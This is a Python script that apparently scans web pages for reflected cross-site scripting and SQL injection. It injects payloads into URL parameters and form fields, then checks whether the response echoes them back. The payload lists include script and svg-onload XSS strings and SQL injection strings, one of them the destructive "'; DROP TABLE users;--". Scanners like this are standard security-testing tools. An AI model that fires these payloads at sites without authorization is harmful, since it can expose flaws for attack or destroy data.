import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urlencode, urljoin

XSS_PAYLOADS = ['<script>alert(1)</script>', '"><svg/onload=alert(1)>']
SQLI_PAYLOADS = ["' OR '1'='1", "'; DROP TABLE users;--"]

def test_xss_sqli_in_url(url):
    results = []
    parsed = urlparse(url)
    if not parsed.query:
        return results
    
    base = url.split('?')[0]
    params = dict([p.split('=') if '=' in p else (p, '') for p in parsed.query.split('&')])

    for key in params:
        for payload in XSS_PAYLOADS + SQLI_PAYLOADS:
            test_params = params.copy()
            test_params[key] = payload
            test_url = f"{base}?{urlencode(test_params)}"
            try:
                r = requests.get(test_url, timeout=5)
                if payload in r.text:
                    results.append({
                        "param": key,
                        "payload": payload,
                        "url": test_url,
                        "reflected": True
                    })
            except:
                continue
    return results

def test_xss_sqli_in_forms(url):
    results = []
    try:
        r = requests.get(url, timeout=10)
        soup = BeautifulSoup(r.text, 'html.parser')
        forms = soup.find_all('form')
        for form in forms:
            action = form.get('action') or url
            method = form.get('method', 'get').lower()
            inputs = form.find_all('input')
            for payload in XSS_PAYLOADS + SQLI_PAYLOADS:
                data = {i.get('name'): payload for i in inputs if i.get('name')}
                target = urljoin(url, action)
                try:
                    if method == 'post':
                        res = requests.post(target, data=data, timeout=5)
                    else:
                        res = requests.get(target, params=data, timeout=5)
                    if payload in res.text:
                        results.append({
                            "form_action": action,
                            "payload": payload,
                            "reflected": True
                        })
                except:
                    continue
    except:
        pass
    return results